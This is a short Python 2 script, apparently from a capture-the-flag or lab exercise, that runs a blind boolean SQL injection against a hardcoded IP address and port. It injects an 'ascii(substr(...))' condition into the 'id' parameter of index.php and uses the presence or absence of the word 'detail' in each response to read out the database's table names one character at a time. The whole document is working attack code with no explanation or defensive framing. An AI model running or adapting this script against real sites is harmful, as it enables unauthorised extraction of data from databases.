import requests
url = "http://114.55.36.69:20680/index.php?table=news&id=3%20and%20ascii" \
      "(substr((select group_concat(table_name) from information_schema.tables " \
      "where%20table_schema=database()%20limit%200,1),"
for i in range(100):
    for k in range(96, 127):
        url1 = url + str(i) + ",1))=" + str(k)
        re = requests.get(url1)
        if 'detail' not in re.content:
            print chr(k)
            break